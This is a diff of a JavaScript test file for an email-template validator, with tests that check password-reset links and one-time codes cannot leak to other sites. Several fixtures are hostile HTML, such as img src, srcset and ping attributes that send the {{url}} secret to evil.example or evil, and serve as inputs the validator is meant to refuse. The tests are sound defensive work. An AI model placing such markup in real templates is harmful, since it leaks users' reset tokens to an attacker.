@@ -243,8 +243,10 @@ test('a link placeholder cannot hand its one-time secret to another site', () =>
   const layout = SEEDS.layouts[0];
   const withHtml = (extra) => ({ ...reset, html: `${reset.html}${extra}` });
   // The reviewer's proof of concept: an image the mail client fetches on open.
-  hasError(validateTemplate('password_reset', withHtml('<p><img src="https://evil.example/p.gif?u={{url}}" alt=""></p>'), layout), 'html', /only go in href/);
-  hasError(validateTemplate('password_reset', withHtml('<p><img src="{{url}}" alt=""></p>'), layout), 'html', /only go in href, not in src/);
+  // The image rule (html-safety.js) refuses any placeholder in its address.
+  hasError(validateTemplate('password_reset', withHtml('<p><img src="https://evil.example/p.gif?u={{url}}" alt=""></p>'), layout), 'html', /cannot hold a placeholder/);
+  hasError(validateTemplate('password_reset', withHtml('<p><img src="{{url}}" alt=""></p>'), layout), 'html', /cannot hold a placeholder/);
+  hasError(validateTemplate('password_reset', withHtml('<p><img src="https://x.example/a.png" srcset="{{url}} 2x" alt=""></p>'), layout), 'html', /cannot hold a placeholder/);
   hasError(validateTemplate('password_reset', withHtml('<p><a href="https://evil/?u={{url}}">x</a></p>'), layout), 'html', /whole href value/);
   hasError(validateTemplate('password_reset', withHtml('<p><a href="{{url}}" ping="https://evil/?c={{url}}">x</a></p>'), layout), 'html', /ping attribute/);
   for (const attr of ['srcset', 'background', 'poster']) {
@@ -376,4 +378,12 @@ test('probe f1/f2: an inline tag before a secret does not break the text, a bloc
   const broken = validateLayout(spanLayout, [{ id: 1, action: 'otp', name: 'Code', ...otp, preheader: '{{code}} is your code' }]);
   assert.equal(broken.ok, false);
   assert.match(broken.errors[0].message, /one-time secret/);
+});
+
+test('an uploaded image saves, wrapped as the Visual tab inserts it; an http or data image is refused on the HTML field', () => {
+  const image = '<p><img src="https://app.onhomeroom.com/email-images/0123456789abcdef0123456789abcdef" alt="A team photo" width="320" style="display:block;max-width:100%;height:auto;border:0"></p>';
+  assert.deepEqual(validateTemplate('otp', otp({ html: `<p>{{code}}</p>${image}` }), LAYOUT), { ok: true });
+  hasError(validateTemplate('otp', otp({ html: '<p>{{code}}</p><img src="http://x.example/a.png" alt="">' }), LAYOUT), 'html', /https/);
+  hasError(validateTemplate('otp', otp({ html: '<p>{{code}}</p><img src="data:image/gif;base64,R0lGOD" alt="">' }), LAYOUT), 'html', /data/);
+  hasError(validateTemplate('otp', otp({ html: '<p>{{code}}</p><img src="https://x.example/a.png">' }), LAYOUT), 'html', /alt/);
 });
